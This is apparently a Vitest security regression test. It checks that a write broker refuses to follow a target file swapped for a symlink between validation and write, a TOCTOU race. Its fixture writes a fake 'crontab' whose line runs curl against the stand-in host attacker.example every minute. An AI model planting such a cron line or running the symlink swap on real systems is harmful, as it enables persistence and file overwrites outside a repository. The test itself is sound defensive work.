// @vitest-environment node
/**
 * P1-1 (codex review round 7, SECURITY) — the write-side TOCTOU in
 * `write-broker.ts`'s precondition-backed overwrite path.
 *
 * `captureSnapshot` (round 2's guard, `write-broker.ts:481-484` at the time
 * of the round-7 finding) `lstat`s + `realpath`s a precondition path to
 * prove it is a real, contained file before trusting its bytes. Before this
 * fix, the actual write ran much later — after lock acquisition and the
 * precondition-match check — as a completely separate `writeFile(op.absPath,
 * …)` call. That is two independent filesystem path lookups with a gap
 * between them: a process with no stake in this batch's locks (an SDK
 * structural tool from another chat session, a build script, anything
 * running in the repo's working tree) can replace `op.absPath` with a
 * symlink in that gap. `writeFile` follows symlinks, so the restore write
 * would land wherever the symlink points — potentially outside the repo,
 * with content the broker's OWN caller supplied (an undo/redo's own
 * before/after bytes) landing at a destination the attacker chose.
 *
 * This drives that exact race deterministically, the same way
 * `ledger-undo-backup-race.test.ts` drives the analogous READ-side race
 * (round 6): there is no way to make two real OS threads race inside a
 * single-threaded Node test both deterministically and portably, so this
 * hooks the precise seam where the write's `open` call begins and performs
 * the attacker's swap there, as a side effect of that call — exactly the
 * interleaving the bug required, since `captureSnapshot` has already
 * validated the path as safe by the time this fires.
 *
 * `node:fs/promises` is mocked file-wide (delegating to the real
 * implementation for everything except one intercepted `open`), kept in its
 * own file rather than folded into `write-broker.test.ts` so the mock can't
 * affect that suite's many other cases. `raceHookState` is built via
 * `vi.hoisted` — a plain module-level `let` closed over by the `vi.mock`
 * factory is a documented Vitest hazard (the factory is hoisted above the
 * rest of the file).
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const raceHookState = vi.hoisted(() => ({
  current: null as { targetPath: string; symlinkTo: string } | null,
}))

vi.mock('node:fs/promises', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:fs/promises')>()
  const open: typeof actual.open = async (path, flags, mode) => {
    const hook = raceHookState.current
    if (hook !== null && path === hook.targetPath) {
      // One-shot: fires exactly once, exactly like a single attacker
      // action landing in a single race window — not a persistent
      // interception of every future open of this path.
      raceHookState.current = null
      await actual.unlink(hook.targetPath)
      await actual.symlink(hook.symlinkTo, hook.targetPath)
    }
    return actual.open(path, flags, mode)
  }
  return { ...actual, open }
})

function installOpenRaceHook(targetPath: string, symlinkTo: string): void {
  raceHookState.current = { targetPath, symlinkTo }
}

function clearOpenRaceHook(): void {
  raceHookState.current = null
}

import { lstat, mkdtemp, readFile, realpath, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { createFileLockManager, type FileLockManager, type LockEvent } from '../edit-service/file-lock-manager'
import { brokeredWrite } from './write-broker'

let root: string
let outsideDir: string
let events: LockEvent[]
let lockManager: FileLockManager

beforeEach(async () => {
  clearOpenRaceHook()
  root = await realpath(await mkdtemp(join(tmpdir(), 'write-broker-race-')))
  outsideDir = await mkdtemp(join(tmpdir(), 'write-broker-race-secret-'))
  events = []
  lockManager = createFileLockManager({ onEvent: (e) => events.push(e) })
})

afterEach(async () => {
  clearOpenRaceHook()
  await rm(root, { recursive: true, force: true })
  await rm(outsideDir, { recursive: true, force: true })
})

describe('precondition-backed write TOCTOU (P1-1, codex review round 7, SECURITY)', () => {
  it('refuses (and never writes through) a write target swapped for a symlink between the precondition check and the write', async () => {
    const secretPath = join(outsideDir, 'crontab')
    const secretContent = '* * * * * curl attacker.example/pwned\n'
    await writeFile(secretPath, secretContent)

    const targetPath = join(root, 'App.vue')
    await writeFile(targetPath, 'BEFORE')

    // Arms the swap to fire the FIRST time production code opens this
    // exact path for the write — i.e. exactly at the seam between
    // `captureSnapshot`'s lstat+realpath validation (already run and
    // already passed by the time the write's `open` call happens) and
    // the write that follows it.
    installOpenRaceHook(targetPath, secretPath)

    const result = await brokeredWrite({
      canonicalRoot: root,
      journal: [{ file: 'App.vue', content: 'BEFORE' }],
      ops: [{ kind: 'write', repoRel: 'App.vue', absPath: targetPath, content: 'AFTER' }],
      lockManager,
      preconditions: [
        {
          repoRel: 'App.vue',
          absPath: targetPath,
          expect: { exists: true, content: Buffer.from('BEFORE') },
        },
      ],
    })

    // The hook is one-shot and only fires on a real production `open`
    // call — if this is still armed, the test never exercised the race
    // at all, and a green run would prove nothing.
    expect(raceHookState.current).toBeNull()

    expect(result.ok).toBe(false)

    // The load-bearing assertions: the external "secret" was never
    // overwritten with the broker's write content, the symlink standing
    // in for the repo file was never replaced with plain restored
    // content (proving the write never followed it), and the secret's
    // own bytes are untouched.
    expect((await lstat(targetPath)).isSymbolicLink()).toBe(true)
    expect(await readFile(secretPath, 'utf8')).toBe(secretContent)
  })
})
